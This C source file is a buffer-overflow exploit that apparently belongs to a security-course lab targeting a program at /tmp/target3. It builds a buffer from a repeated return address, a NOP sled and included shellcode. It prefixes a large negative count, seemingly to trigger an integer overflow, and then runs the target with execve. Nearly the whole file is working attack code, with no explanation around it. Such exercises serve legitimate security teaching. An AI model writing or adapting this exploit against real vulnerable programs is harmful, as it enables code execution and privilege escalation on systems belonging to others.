#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

#define NOP	0x90

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET;
  args[1] = "hi there";
  args[2] = NULL;
  env[0] = NULL;

  char *buff, *ptr;
  long *addr_ptr, addr;

  // sizeof(widget_t) = 20
  int bsize = 4900;
  int i;

  if (!(buff = malloc(bsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }

  // addr = 0x80483b0;
  // addr = 0x00000000;
  addr = 0xbfffe110;

  ptr = buff;
  addr_ptr = (long *) ptr;
  for (i = 0; i < bsize; i+=4)
    *(addr_ptr++) = addr;

  for (i = 0; i < bsize/2; i++)
    buff[i] = NOP;

  ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  buff[bsize - 1] = '\0';

  buff[0] = '-';
  buff[1] = '2';
  buff[2] = '1';
  buff[3] = '4';
  buff[4] = '7';
  buff[5] = '4';
  buff[6] = '8';
  buff[7] = '3';
  buff[8] = '4';
  buff[9] = '0';
  buff[10] = '3';
  buff[11] = ',';

  args[1] = buff;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}

